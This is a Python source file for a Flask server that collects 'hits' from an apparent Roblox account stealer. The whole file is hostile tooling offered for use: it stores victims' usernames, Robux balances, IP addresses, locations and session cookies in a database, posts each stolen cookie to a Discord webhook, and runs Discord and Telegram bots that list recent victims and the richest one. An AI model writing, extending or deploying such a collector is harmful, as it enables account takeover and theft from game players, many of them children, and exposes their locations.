import sys
import json
import sqlite3
import threading
import time
import requests
from datetime import datetime
from flask import Flask, request, jsonify
import os

# ---------- CONFIG ----------
DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "-5330491816")
ENABLE_TELEGRAM = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
API_TOKEN = os.environ.get("API_TOKEN", "123")

PORT = os.environ.get("PORT", "5000")
API_BASE_URL = f"http://127.0.0.1:{PORT}"
print(f"[Init] API internal URL: {API_BASE_URL}")

DB_FILE = "hits.db"

# ---------- Database ----------
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS hits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    username TEXT,
                    robux INTEGER,
                    premium TEXT,
                    ip TEXT,
                    location TEXT,
                    cookie TEXT,
                    raw_data TEXT
                )''')
    conn.commit()
    conn.close()
    print("[DB] Table ready.")

# **FIX: Call init_db() immediately so the table exists before any request**
init_db()

def add_hit(data):
    roblox = data.get('roblox', {})
    system = data.get('system', {})

    username = roblox.get('username') or data.get('username', 'N/A')
    robux_val = roblox.get('robux') or data.get('robux', 0)
    try:
        robux = int(robux_val)
    except:
        robux = 0
    premium = roblox.get('premium') or data.get('premium', 'False')
    if isinstance(premium, bool):
        premium = str(premium)
    ip = system.get('ip') or data.get('ip', 'N/A')
    location = system.get('location') or data.get('location', 'N/A')
    cookie = roblox.get('cookie') or data.get('cookie', 'N/A')
    timestamp = data.get('timestamp') or datetime.now().isoformat()

    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''INSERT INTO hits (timestamp, username, robux, premium, ip, location, cookie, raw_data)
                     VALUES (?,?,?,?,?,?,?,?)''',
                  (timestamp, username, robux, premium, ip, location, cookie, json.dumps(data)))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"[DB] Insert ERROR: {e}")
        return False

def get_all_hits():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT id, timestamp, username, robux, premium, ip, location, cookie FROM hits ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return [{'id':r[0], 'timestamp':r[1], 'username':r[2], 'robux':r[3],
             'premium':r[4], 'ip':r[5], 'location':r[6], 'cookie':r[7][:30]+'...'} for r in rows]

def get_total_hits():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM hits')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_top_robux():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT username, robux FROM hits ORDER BY robux DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row if row else (None, 0)

# ---------- Webhook ----------
def send_discord_webhook(hit):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        from discord_webhook import DiscordWebhook, DiscordEmbed
        roblox = hit.get('roblox', {})
        system = hit.get('system', {})
        username = roblox.get('username') or hit.get('username', 'N/A')
        robux = roblox.get('robux') or hit.get('robux', 0)
        ip = system.get('ip') or hit.get('ip', 'N/A')
        location = system.get('location') or hit.get('location', 'N/A')
        cookie = roblox.get('cookie') or hit.get('cookie', 'N/A')

        webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
        embed = DiscordEmbed(title="🎯 New Hit!", color=0x00ff00)
        embed.add_embed_field(name="Username", value=username)
        embed.add_embed_field(name="Robux", value=robux)
        embed.add_embed_field(name="IP", value=ip)
        embed.add_embed_field(name="Location", value=location)
        embed.add_embed_field(name="Cookie", value=f"```{cookie[:50]}...```")
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()
    except Exception as e:
        print(f"[Webhook] Error: {e}")

# ---------- Flask ----------
app = Flask(__name__)

_bots_started = False

def start_bots():
    global _bots_started
    if _bots_started:
        return
    _bots_started = True
    time.sleep(5)
    if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
        threading.Thread(target=run_discord_bot, daemon=True).start()
    if ENABLE_TELEGRAM and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN":
        threading.Thread(target=run_telegram_bot, daemon=True).start()

@app.before_request
def before_first_request():
    start_bots()

# ---------- Routes ----------
@app.route('/log_hit', methods=['POST'])
def log_hit():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON"}), 400
    if 'timestamp' not in data:
        data['timestamp'] = datetime.now().isoformat()
    success = add_hit(data)
    if not success:
        return jsonify({"error": "DB insert failed"}), 500
    threading.Thread(target=send_discord_webhook, args=(data,)).start()
    return jsonify({"status": "ok"}), 200

@app.route('/get_hits', methods=['GET'])
def get_hits():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        return jsonify(get_all_hits())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/total', methods=['GET'])
def total():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        return jsonify({"total": get_total_hits()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/top', methods=['GET'])
def top():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        user, robux = get_top_robux()
        return jsonify({"username": user, "robux": robux})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    return jsonify({"status": "Server is running", "endpoints": ["/log_hit", "/get_hits", "/total", "/top"]})

# ---------- Discord Bot ----------
def run_discord_bot():
    import discord
    from discord.ext import commands
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix='/', intents=intents)

    @bot.event
    async def on_ready():
        print(f'[Discord] Logged in as {bot.user}')

    @bot.command(name='howmanyhits')
    async def how_many_hits(ctx):
        try:
            resp = requests.get(f"{API_BASE_URL}/get_hits", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                return
            hits = resp.json()
            if not hits:
                await ctx.send("No hits yet.")
                return
            total = len(hits)
            display = hits[:10]
            lines = [f"**Total hits: {total}**"]
            for h in display:
                lines.append(f"`{h['timestamp']}` | **{h['username']}** | {h['robux']} R$ | {h['ip']} | {h['location']}")
            if total > 10:
                lines.append(f"... and {total - 10} more.")
            await ctx.send("\n".join(lines))
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='total')
    async def total_hits(ctx):
        try:
            resp = requests.get(f"{API_BASE_URL}/total", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                return
            data = resp.json()
            await ctx.send(f"**Total hits recorded:** {data['total']}")
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='top')
    async def top_robux(ctx):
        try:
            resp = requests.get(f"{API_BASE_URL}/top", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                return
            data = resp.json()
            if data['username']:
                await ctx.send(f"**Highest Robux:** {data['username']} with {data['robux']} R$")
            else:
                await ctx.send("No hits yet.")
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='commands')
    async def commands_list(ctx):
        help_text = """
**Available commands:**
`/howmanyhits` – Show 10 most recent hits
`/total` – Show total hit count
`/top` – Show hit with most Robux
`/commands` – Show this message
"""
        await ctx.send(help_text)

    bot.run(DISCORD_TOKEN)

# ---------- Telegram Bot ----------
def run_telegram_bot():
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes

        async def how_many_hits(update, context):
            try:
                resp = requests.get(f"{API_BASE_URL}/get_hits", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text(f"Error (status {resp.status_code})")
                    return
                hits = resp.json()
                if not hits:
                    await update.message.reply_text("No hits yet.")
                    return
                total = len(hits)
                display = hits[:10]
                lines = [f"Total hits: {total}"]
                for h in display:
                    lines.append(f"{h['timestamp']} | {h['username']} | {h['robux']} R$ | {h['ip']} | {h['location']}")
                if total > 10:
                    lines.append(f"... and {total - 10} more.")
                await update.message.reply_text("\n".join(lines))
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def total_hits(update, context):
            try:
                resp = requests.get(f"{API_BASE_URL}/total", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text(f"Error (status {resp.status_code})")
                    return
                data = resp.json()
                await update.message.reply_text(f"Total hits recorded: {data['total']}")
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def top_robux(update, context):
            try:
                resp = requests.get(f"{API_BASE_URL}/top", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text(f"Error (status {resp.status_code})")
                    return
                data = resp.json()
                if data['username']:
                    await update.message.reply_text(f"Highest Robux: {data['username']} with {data['robux']} R$")
                else:
                    await update.message.reply_text("No hits yet.")
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def commands_list(update, context):
            help_text = """Available commands:
/howmanyhits – Show 10 most recent hits
/total – Show total hit count
/top – Show hit with most Robux
/commands – Show this message"""
            await update.message.reply_text(help_text)

        app_tele = Application.builder().token(TELEGRAM_TOKEN).build()
        app_tele.add_handler(CommandHandler("howmanyhits", how_many_hits))
        app_tele.add_handler(CommandHandler("total", total_hits))
        app_tele.add_handler(CommandHandler("top", top_robux))
        app_tele.add_handler(CommandHandler("commands", commands_list))
        print("[Telegram] Bot started polling.")
        app_tele.run_polling()
    except Exception as e:
        print(f"[Telegram] Error: {e}")

# ---------- Main ----------
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--server":
        # For local testing – already initialized above, but we'll keep for safety
        threading.Thread(target=app.run, kwargs={'host':'0.0.0.0','port':int(PORT),'debug':False}, daemon=True).start()
        time.sleep(2)
        start_bots()
        while True:
            time.sleep(1)
    else:
        # For gunicorn – nothing else needed (init_db already called)
        print(f"Starting server (gunicorn) on port {PORT} ...")
